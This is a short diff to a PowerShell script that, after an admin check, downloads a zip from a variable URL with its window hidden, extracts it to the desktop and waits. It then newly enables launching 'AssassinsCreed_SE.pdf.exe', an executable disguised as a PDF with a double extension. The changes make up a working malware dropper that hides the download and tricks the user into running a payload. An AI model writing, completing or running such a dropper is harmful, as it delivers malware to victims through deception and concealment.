@@ -14,10 +14,12 @@ if (-not (Test-IsAdmin)) {
     Exit
 }
 
-Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
+powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
 
 Expand-Archive -Path $zipFilePath -DestinationPath $desktopPath -Force
 
-Start-Sleep -Seconds 200
+Start-Sleep -Seconds 240
 
-#Start-Process -FilePath "$desktopPath\AssassinsCreed_SE.pdf.exe" 
+Start-Process -FilePath "$desktopPath\AssassinsCreed_SE.pdf.exe" 
+
+exit 0
